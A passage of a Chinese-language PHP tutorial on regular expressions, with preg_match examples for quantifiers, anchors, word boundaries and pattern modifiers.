align="left">至少m次，最大次数不限制</td></tr><tr><td align="center">()</td><td align="left">改变优先级或者将某个字符串视为一个整体，匹配到的数据取出来也可以使用它</td></tr></tbody></table></div></div><p>&emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>1. + 匹配最少1次前面的字符</strong></font><br></font></p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token operator">&lt;</span>?php<span class="token variable">$zz</span> <span class="token operator">=</span> <span class="token string">'/\d+/'</span><span class="token punctuation">;</span><span class="token variable">$string</span> <span class="token operator">=</span> <span class="token string">"迪奥和奥迪250都是我最爱"</span><span class="token punctuation">;</span>//待会儿再试试中间没有0-9的情况//<span class="token variable">$string</span> <span class="token operator">=</span> <span class="token string">"迪奥和奥迪都是我最爱"</span><span class="token punctuation">;</span>if<span class="token punctuation">(</span>preg_match<span class="token punctuation">(</span><span class="token variable">$zz</span>, <span class="token variable">$string</span>, <span class="token variable">$matches</span><span class="token punctuation">))</span><span class="token punctuation">{</span>   <span class="token keyword">echo</span> <span class="token string">'匹配到了，结果为：'</span><span class="token punctuation">;</span>   var_dump<span class="token punctuation">(</span><span class="token variable">$matches</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>else<span class="token punctuation">{</span>   <span class="token keyword">echo</span> <span class="token string">'没有匹配到'</span><span class="token punctuation">;</span><span class="token punctuation">}</span>?<span class="token operator">></span>运行结果：匹配成功，证明了\d+中的+。\d是匹配数字，而+是最少匹配一次前面的字符。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>2. * 匹配0次或者任意多次前面的字符</strong></font><br></font></p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token operator">&lt;</span>?php<span class="token variable">$zz</span> <span class="token operator">=</span> <span class="token string">'/\w*/'</span><span class="token punctuation">;</span><span class="token variable">$string</span> <span class="token operator">=</span> <span class="token string">"!@!@!!@#@!<span class="token variable">$@#!</span>"</span><span class="token punctuation">;</span>//待会儿再试试中间没有0-9的情况//<span class="token variable">$string1</span> <span class="token operator">=</span> <span class="token string">"!@#!@#!abcABC#@#!"</span><span class="token punctuation">;</span>if<span class="token punctuation">(</span>preg_match<span class="token punctuation">(</span><span class="token variable">$zz</span>, <span class="token variable">$string</span>, <span class="token variable">$matches</span><span class="token punctuation">))</span><span class="token punctuation">{</span>   <span class="token keyword">echo</span> <span class="token string">'匹配到了，结果为：'</span><span class="token punctuation">;</span>   var_dump<span class="token punctuation">(</span><span class="token variable">$matches</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>else<span class="token punctuation">{</span>   <span class="token keyword">echo</span> <span class="token string">'没有匹配到'</span><span class="token punctuation">;</span><span class="token punctuation">}</span>?<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>说明，注释掉的$string1和$string都匹配成功了。因为，\w是匹配的0-9A-Za-z_，而*是说明前面的\w可以不存在。如果存在可以有1个或者多个。</p></blockquote><p>&emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>3. ? 前面的字符出现0次或者1次，可有可无</strong></font><br></font></p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token operator">&lt;</span>?php<span class="token variable">$zz</span> <span class="token operator">=</span> <span class="token string">'/ABC\d?ABC/'</span><span class="token punctuation">;</span><span class="token variable">$string</span> <span class="token operator">=</span> <span class="token string">"ABC1ABC"</span><span class="token punctuation">;</span>//待会儿再试试中间没有0-9的情况//<span class="token variable">$string1</span> <span class="token operator">=</span> <span class="token string">"ABC888888ABC"</span><span class="token punctuation">;</span>//<span class="token variable">$string2</span> <span class="token operator">=</span> <span class="token string">"ABCABC"</span><span class="token punctuation">;</span>if<span class="token punctuation">(</span>preg_match<span class="token punctuation">(</span><span class="token variable">$zz</span>, <span class="token variable">$string</span>, <span class="token variable">$matches</span><span class="token punctuation">))</span><span class="token punctuation">{</span>   <span class="token keyword">echo</span> <span class="token string">'匹配到了，结果为：'</span><span class="token punctuation">;</span>   var_dump<span class="token punctuation">(</span><span class="token variable">$matches</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>else<span class="token punctuation">{</span>   <span class="token keyword">echo</span> <span class="token string">'没有匹配到'</span><span class="token punctuation">;</span><span class="token punctuation">}</span>?<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>匹配$string,$string2成功，但是匹配$string1失败。<br>因为匹配前后都是ABC，中间是一个0-9。0-9可有可无，但是不能有多个。</p></blockquote><p>&emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>4. . (点) 匹配除\n以外的所有字符</strong></font><br></font></p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token operator">&lt;</span>?php<span class="token variable">$zz</span> <span class="token operator">=</span> <span class="token string">'/gg.+gg/'</span><span class="token punctuation">;</span><span class="token variable">$string</span> <span class="token operator">=</span> <span class="token string">"ABC1ABC"</span><span class="token punctuation">;</span>if<span class="token punctuation">(</span>preg_match<span class="token punctuation">(</span><span class="token variable">$zz</span>, <span class="token variable">$string</span>, <span class="token variable">$matches</span><span class="token punctuation">))</span><span class="token punctuation">{</span>   <span class="token keyword">echo</span> <span class="token string">'匹配到了，结果为：'</span><span class="token punctuation">;</span>   var_dump<span class="token punctuation">(</span><span class="token variable">$matches</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>else<span class="token punctuation">{</span>   <span class="token keyword">echo</span> <span class="token string">'没有匹配到'</span><span class="token punctuation">;</span><span class="token punctuation">}</span>?<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>匹配$string,$string2成功，但是匹配$string1失败。<br>因为匹配前后都是ABC，中间是一个0-9。0-9可有可无，但是不能有多个。</p></blockquote><p>&emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>5. |（竖线），或者，优先级最低</strong></font><br></font></p><p>我们通过实验来看优先级和或者的匹配</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token operator">&lt;</span>?php<span class="token variable">$zz</span> <span class="token operator">=</span> <span class="token string">'/abc|bcd/'</span><span class="token punctuation">;</span><span class="token variable">$string1</span> <span class="token operator">=</span> <span class="token string">"abccd"</span><span class="token punctuation">;</span><span class="token variable">$string2</span> <span class="token operator">=</span> <span class="token string">"ggggbcd"</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>preg_match<span class="token punctuation">(</span><span class="token variable">$zz</span>, <span class="token variable">$string1</span>, <span class="token variable">$matches</span><span class="token punctuation">))</span> <span class="token punctuation">{</span>   <span class="token keyword">echo</span> <span class="token string">'匹配到了，结果为：'</span><span class="token punctuation">;</span>   var_dump<span class="token punctuation">(</span><span class="token variable">$matches</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>   <span class="token keyword">echo</span> <span class="token string">'没有匹配到'</span><span class="token punctuation">;</span><span class="token punctuation">}</span>?<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们来看看：<br>    1.最开始我匹配的想法是想匹配的是abccd或者是abbcd。可是，匹配$string1和$string2，匹配出来的结果却是abc和bcd.<br>    2.实现了或者匹配，匹配出来了abc或者是bcd。它还没有字符串连续在一起的优先级高。</p><p>那么问题来了，我要匹配上例中的abccd或者是abbcd怎么办？<br><font color="red">需要使用到<strong>()</strong>来改变优先级。</font></p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token operator">&lt;</span>?php<span class="token variable">$zz</span> <span class="token operator">=</span> <span class="token string">'/ab(c|b)cd/'</span><span class="token punctuation">;</span><span class="token variable">$string1</span> <span class="token operator">=</span> <span class="token string">"起来abccd阅兵"</span><span class="token punctuation">;</span><span class="token variable">$string2</span> <span class="token operator">=</span> <span class="token string">"ggggbcd"</span><span class="token punctuation">;</span><span class="token variable">$string3</span> <span class="token operator">=</span> <span class="token string">'中国abbcd未来'</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>preg_match<span class="token punctuation">(</span><span class="token variable">$zz</span>, <span class="token variable">$string1</span>, <span class="token variable">$matches</span><span class="token punctuation">))</span> <span class="token punctuation">{</span>   <span class="token keyword">echo</span> <span class="token string">'匹配到了，结果为：'</span><span class="token punctuation">;</span>   var_dump<span class="token punctuation">(</span><span class="token variable">$matches</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>   <span class="token keyword">echo</span> <span class="token string">'没有匹配到'</span><span class="token punctuation">;</span><span class="token punctuation">}</span>?<span class="token operator">></span>运行结果：匹配到了，结果为：array<span class="token punctuation">(</span>2<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token punctuation">[</span>0<span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">></span> string<span class="token punctuation">(</span>5<span class="token punctuation">)</span> <span class="token string">"abccd"</span> <span class="token punctuation">[</span>1<span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">></span> string<span class="token punctuation">(</span>1<span class="token punctuation">)</span> <span class="token string">"c"</span> <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>结论：<br>   1.确实匹配了了abccd或者abbcd（$string1 or $string3）。<br>   2.但是匹配的数组里面多了一个元素，这个元素的下标为1<br>   3.()中的内容只要匹配成功，会把匹配到的数据放到下标为1的这个数组元素中。</p></blockquote><p>&emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>6. ^ （抑扬符），必须要以^之后的字符串开始</strong></font><br></font></p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token operator">&lt;</span>?php<span class="token variable">$zz</span> <span class="token operator">=</span> <span class="token string">'/^猪哥好帅\w+/'</span><span class="token punctuation">;</span><span class="token variable">$string1</span> <span class="token operator">=</span> <span class="token string">"猪哥好帅abccdaaaasds"</span><span class="token punctuation">;</span>//<span class="token variable">$string2</span>没有以猪哥好帅开始<span class="token variable">$string2</span> <span class="token operator">=</span> <span class="token string">"帅abccdaaaasds"</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>preg_match<span class="token punctuation">(</span><span class="token variable">$zz</span>, <span class="token variable">$string1</span>, <span class="token variable">$matches</span><span class="token punctuation">))</span> <span class="token punctuation">{</span>   <span class="token keyword">echo</span> <span class="token string">'匹配到了，结果为：'</span><span class="token punctuation">;</span>   var_dump<span class="token punctuation">(</span><span class="token variable">$matches</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>   <span class="token keyword">echo</span> <span class="token string">'没有匹配到'</span><span class="token punctuation">;</span><span class="token punctuation">}</span>?<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>通过实验发现以下结论：<br>   1.$string1匹配成功，$string2没有匹配成功<br>   2.因为$string1是以指定的字符开始的<br>   3.而$string2并没有以^之后的字符开始<br>   4.翻译这个正则的意思就是：以要猪哥好帅开始后面接a-zA-Z0-9_最少一个字符。</p></blockquote><p>&emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>7. $ （美元符）必须要以$之前的字符结束</strong></font><br></font></p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token operator">&lt;</span>?php<span class="token variable">$zz</span> <span class="token operator">=</span> <span class="token string">'/\d+努力$/'</span><span class="token punctuation">;</span><span class="token variable">$string1</span> <span class="token operator">=</span> <span class="token string">"12321124333努力"</span><span class="token punctuation">;</span>//<span class="token variable">$string2</span><span class="token variable">$string2</span> <span class="token operator">=</span> <span class="token string">"12311124112313力"</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>preg_match<span class="token punctuation">(</span><span class="token variable">$zz</span>, <span class="token variable">$string1</span>, <span class="token variable">$matches</span><span class="token punctuation">))</span> <span class="token punctuation">{</span>   <span class="token keyword">echo</span> <span class="token string">'匹配到了，结果为：'</span><span class="token punctuation">;</span>   var_dump<span class="token punctuation">(</span><span class="token variable">$matches</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>   <span class="token keyword">echo</span> <span class="token string">'没有匹配到'</span><span class="token punctuation">;</span><span class="token punctuation">}</span>?<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>我们运行一下看一下结果，得出来的结论：<br>   1.$string1 匹配成功，而$string2匹配不成功<br>   2.$之前的字符是\d+，后面接着中文的努力。<br>   3.因此，匹配的是这一个整体。\d指的是0-9的整型,+号代表最少一个0-9</p></blockquote><p>&emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>8. \b和\B 词边界和非词边界</strong></font><br></font></p><p>我们来讲解什么是边界：</p><p>   1.正则表达示是有边界的，这个边界是定界符的开始和结尾是正则的边界。</p><p>   2.this是一个英文单词，后面加上一个空格，意味着这个词结束了，到达了这个词的边界</p><p>\b词边界，就是指必须要在最前或者最后。<br>\B非边界，就是不能在一个正则表达示的最前或者最后。</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token operator">&lt;</span>?php<span class="token variable">$zz</span> <span class="token operator">=</span> <span class="token string">'/\w+\b/'</span><span class="token punctuation">;</span><span class="token variable">$string1</span> <span class="token operator">=</span> <span class="token string">"this is a apple"</span><span class="token punctuation">;</span><span class="token variable">$string2</span> <span class="token operator">=</span> <span class="token string">"thisis a apple"</span><span class="token punctuation">;</span><span class="token variable">$string3</span> <span class="token operator">=</span> <span class="token string">"thisisaapple"</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>preg_match<span class="token punctuation">(</span><span class="token variable">$zz</span>, <span class="token variable">$string1</span>, <span class="token variable">$matches</span><span class="token punctuation">))</span> <span class="token punctuation">{</span>   <span class="token keyword">echo</span> <span class="token string">'匹配到了，结果为：'</span><span class="token punctuation">;</span>   var_dump<span class="token punctuation">(</span><span class="token variable">$matches</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>   <span class="token keyword">echo</span> <span class="token string">'没有匹配到'</span><span class="token punctuation">;</span><span class="token punctuation">}</span>?<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>结论：<br>   1.$string1、$string2和$string3都匹配成功。<br>   2.$string1匹配的时候this 空格是边界<br>   3.$string2匹配的时候thisis是边界<br>   4.$string3匹配的时候，thisisaapple到了整个正则表达示的最后，因此也是边界。所以匹配成功。</p></blockquote><p>我们来实验一下非词边界：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token operator">&lt;</span>?php<span class="token variable">$zz</span> <span class="token operator">=</span> <span class="token string">'/\Bthis/'</span><span class="token punctuation">;</span><span class="token variable">$string1</span> <span class="token operator">=</span> <span class="token string">"hellothis9"</span><span class="token punctuation">;</span>//<span class="token variable">$string2</span> <span class="token operator">=</span> <span class="token string">"hello this9"</span><span class="token punctuation">;</span>//<span class="token variable">$string2</span> <span class="token operator">=</span> <span class="token string">"this9中国万岁"</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>preg_match<span class="token punctuation">(</span><span class="token variable">$zz</span>, <span class="token variable">$string1</span>, <span class="token variable">$matches</span><span class="token punctuation">))</span> <span class="token punctuation">{</span>   <span class="token keyword">echo</span> <span class="token string">'匹配到了，结果为：'</span><span class="token punctuation">;</span>   var_dump<span class="token punctuation">(</span><span class="token variable">$matches</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>   <span class="token keyword">echo</span> <span class="token string">'没有匹配到'</span><span class="token punctuation">;</span><span class="token punctuation">}</span>?<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>总结：<br>   1.匹配$string1成功而$string2不成功。<br>   2.因为\B后接的是this，所以this不能在词边界（空格和开始结尾）的位置出现。</p></blockquote><p>&emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>9. {m}有且只能出现m次</strong></font><br></font></p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token operator">&lt;</span>?php<span class="token variable">$zz</span> <span class="token operator">=</span> <span class="token string">'/喝\d{3}酒/'</span><span class="token punctuation">;</span><span class="token variable">$string1</span> <span class="token operator">=</span> <span class="token string">"喝988酒"</span><span class="token punctuation">;</span>//<span class="token variable">$string2</span> <span class="token operator">=</span> <span class="token string">"喝98811酒"</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>preg_match<span class="token punctuation">(</span><span class="token variable">$zz</span>, <span class="token variable">$string1</span>, <span class="token variable">$matches</span><span class="token punctuation">))</span> <span class="token punctuation">{</span>   <span class="token keyword">echo</span> <span class="token string">'匹配到了，结果为：'</span><span class="token punctuation">;</span>   var_dump<span class="token punctuation">(</span><span class="token variable">$matches</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>   <span class="token keyword">echo</span> <span class="token string">'没有匹配到'</span><span class="token punctuation">;</span><span class="token punctuation">}</span>?<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>结论：<br>上例中\d{3}我规定了0-9只能出现3次，多一次少一次都不行。</p></blockquote><p>&emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>10. {n,m} 可以出现n到m次</strong></font><br></font></p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token operator">&lt;</span>?php<span class="token variable">$zz</span> <span class="token operator">=</span> <span class="token string">'/喝\d{1,3}酒/'</span><span class="token punctuation">;</span><span class="token variable">$string1</span> <span class="token operator">=</span> <span class="token string">"喝9酒"</span><span class="token punctuation">;</span>//<span class="token variable">$string2</span> <span class="token operator">=</span> <span class="token string">"喝988酒"</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>preg_match<span class="token punctuation">(</span><span class="token variable">$zz</span>, <span class="token variable">$string1</span>, <span class="token variable">$matches</span><span class="token punctuation">))</span> <span class="token punctuation">{</span>   <span class="token keyword">echo</span> <span class="token string">'匹配到了，结果为：'</span><span class="token punctuation">;</span>   var_dump<span class="token punctuation">(</span><span class="token variable">$matches</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>   <span class="token keyword">echo</span> <span class="token string">'没有匹配到'</span><span class="token punctuation">;</span><span class="token punctuation">}</span>?<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>结论：<br>上例中\d{1,3}我规定了0-9只能出现1次，2次或者3次。其它次数都是错的</p></blockquote><p>&emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>11. {m,} 至少m次，最大次数不限制</strong></font><br></font></p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token operator">&lt;</span>?php<span class="token variable">$zz</span> <span class="token operator">=</span> <span class="token string">'/喝\d{2,}/'</span><span class="token punctuation">;</span><span class="token variable">$string1</span> <span class="token operator">=</span> <span class="token string">"喝9"</span><span class="token punctuation">;</span>//<span class="token variable">$string2</span> <span class="token operator">=</span> <span class="token string">"喝98"</span><span class="token punctuation">;</span>//<span class="token variable">$string3</span> <span class="token operator">=</span> <span class="token string">"喝98122121"</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>preg_match<span class="token punctuation">(</span><span class="token variable">$zz</span>, <span class="token variable">$string1</span>, <span class="token variable">$matches</span><span class="token punctuation">))</span> <span class="token punctuation">{</span>   <span class="token keyword">echo</span> <span class="token string">'匹配到了，结果为：'</span><span class="token punctuation">;</span>   var_dump<span class="token punctuation">(</span><span class="token variable">$matches</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>   <span class="token keyword">echo</span> <span class="token string">'没有匹配到'</span><span class="token punctuation">;</span><span class="token punctuation">}</span>?<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>结论：<br>上例中\d{2,}我规定喝后面的0-9最少出现两次，最多次数不限。因此$string1是匹配不成功的，$string2是匹配成功的。$string3是匹配成功的。</p></blockquote><p>&emsp;</p><h4 id="6-模式修正符"><font face="Comic sans MS"><font color="#FF6347">6. 模式修正符</font></font><a href="post/PHP-Regular-Expression#6-模式修正符"></a></h4><p><font face="Comic sans MS">我们通过元字符和原子完成了正则表达示的入门。有一些特殊情况我们依然需要来处理。<br>如果abc在第二行的开始处如何匹配？<br><font color="red">我不希望正则表达示特别贪婪的匹配全部，只匹配一部份怎么办？</font><br>这个时候，我们就需要用到下面的这些模式匹配来增强正则的功能。</font></p><p><font color="#00B2EE"><strong>常用的模式匹配符有：</strong></font><br></p><div class="article-bounded"><div class="article-table"><table><thead><tr><th align="center">模式匹配符</th><th align="left">功能</th></tr></thead><tbody><tr><td align="center">i</td><td align="left">模式中的字符将同时匹配大小写字母.</td></tr><tr><td align="center">m</td><td align="left">字符串视为多行</td></tr><tr><td align="center">s</td><td align="left">将字符串视为单行,换行符作为普通字符.</td></tr><tr><td align="center">x</td><td align="left">将模式中的空白忽略.</td></tr><tr><td align="center">A</td><td align="left">强制仅从目标字符串的开头开始匹配.</td></tr><tr><td align="center">D</td><td align="left">模式中的美元元字符仅匹配目标字符串的结尾.</td></tr><tr><td align="center">U</td><td align="left">匹配最近的字符串.</td></tr></tbody></table></div></div><p><font face="Comic sans MS">模式匹配符的用法如下：<font color="red"><strong>/ 正则表达示/模式匹配符</strong></font> &emsp;   <font color="#00B2EE">模式匹配符是放在正则表达式的最后的。</font><br></font>例如： /\w+/<font color="red"><strong>s</strong></font> </p><p>&emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>1. i 不区分大小写</strong></font><br></font></p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token operator">&lt;</span>?php //在后面加上了一个i     <span class="token variable">$pattern</span> <span class="token operator">=</span> <span class="token string">'/ABC/i'</span><span class="token punctuation">;</span> <span class="token variable">$string</span> <span class="token operator">=</span> <span class="token string">'8988abc12313'</span><span class="token punctuation">;</span><span class="token variable">$string1</span> <span class="token operator">=</span> <span class="token string">'11111ABC2222'</span><span class="token punctuation">;</span> if<span class="token punctuation">(</span>preg_match<span class="token punctuation">(</span><span class="token variable">$pattern</span>, <span class="token variable">$string</span>, <span class="token variable">$matches</span><span class="token punctuation">))</span><span class="token punctuation">{</span>     <span class="token keyword">echo</span> <span class="token string">'匹配到了，结果为：'</span><span class="token punctuation">;</span>     var_dump<span class="token punctuation">(</span><span class="token variable">$matches</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>else<span class="token punctuation">{</span>     <span class="token keyword">echo</span> <span class="token string">'没有匹配到'</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span>?<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>结论，不论是$string还是$string1全都匹配成功了。因此，在后面加上了i之后，能够不共分匹配内容的大小写。</p></blockquote><p>&emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>2. m 视为多行</strong></font><br></font><font color="red">正则在匹配的时候，要匹配的目标字符串我们通常视为一行。</font><br><font color="#00B2EE"><strong>“行起始”元字符（^）</strong></font>仅仅匹配字符串的起始，<font color="#00B2EE"><strong>“行结束”元字符（$）</strong></font>仅仅匹配字符串的结束。<br>当设定了此修正符，“行起始”和“行结束”除了匹配整个字符串开头和结束外，还分别匹配其中的换行符的之后和之前。<br><font color="red"><strong>注意：</strong></font><strong>如果要匹配的字符串中没有“\n”字符或者模式中没有 ^ 或 $，则设定此修正符没有任何效果。</strong></p><p>我们通过实验和代码来验证一下这个特点：<br>第一次匹配，你会发现匹配不成功：<font color="#FF6347">(1)↓↓</font></p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token operator">&lt;</span>?php<span class="token variable">$pattern</span> <span class="token operator">=</span> <span class="token string">'/^a\d+/'</span><span class="token punctuation">;</span><span class="token variable">$string</span> <span class="token operator">=</span> <span class="token string">"我的未来在自己手中我需要不断的努力a9是一个不错的字符表示怎么办呢，其实需要不断奋进"</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>preg_match<span class="token punctuation">(</span><span class="token variable">$pattern</span>, <span class="token variable">$string</span>, <span class="token variable">$matches</span><span class="token punctuation">))</span> <span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">'匹配到了，结果为：'</span><span class="token punctuation">;</span>    var_dump<span class="token punctuation">(</span><span class="token variable">$matches</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">'没有匹配到'</span><span class="token punctuation">;</span><span class="token punctuation">}</span>?<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;<br>第二次匹配，我们加上m 试试：<font color="#FF6347">(2)↓↓</font></p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token operator">&lt;</span>?php<span class="token variable">$pattern</span> <span class="token operator">=</span> <span class="token string">'/^a\d+/m'</span><span class="token punctuation">;</span><span class="token variable">$string</span> <span class="token operator">=</span> <span class="token string">"我的未来在自己手中我需要不断的努力a9是一个不错的字符表示怎么办呢，其实需要不断奋进"</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>preg_match<span class="token punctuation">(</span><span class="token variable">$pattern</span>, <span class="token variable">$string</span>, <span class="token variable">$matches</span><span class="token punctuation">))</span> <span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">'匹配到了，结果为：'</span><span class="token punctuation">;</span>    var_dump<span class="token punctuation">(</span><span class="token variable">$matches</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">'没有匹配到'</span><span class="token punctuation">;</span><span class="token punctuation">}</span>?<span class="token operator">></span>运行结果：匹配到了，结果为：array<span class="token punctuation">(</span>1<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token punctuation">[</span>0<span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">></span> string<span class="token punctuation">(</span>2<span class="token punctuation">)</span> <span class="token string">"a9"</span> <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>哦耶！匹配成功了。/^a\d+/ 匹配的内容是a9，必须得在行开始处。在第二行也被匹配成功了。</p></blockquote><p>&emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>3. s 视为一行</strong></font><br>如果设定了此修正符，模式中的圆点元字符（.）匹配所有的字符，包括换行符。<br></font><br>第一次，不加模式匹配符s：<font color="#FF6347">(1)↓↓</font></p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token operator">&lt;</span>?php<span class="token variable">$pattern</span> <span class="token operator">=</span> <span class="token string">'/新的未来.+\d+/'</span><span class="token punctuation">;</span><span class="token variable">$string</span> <span class="token operator">=</span> <span class="token string">'新的未来987654321'</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>preg_match<span class="token punctuation">(</span><span class="token variable">$pattern</span>, <span class="token variable">$string</span>, <span class="token variable">$matches</span><span class="token punctuation">))</span> <span class="token punctuation">{</span>   <span class="token keyword">echo</span> <span class="token string">'匹配到了，结果为：'</span><span class="token punctuation">;</span>   var_dump<span 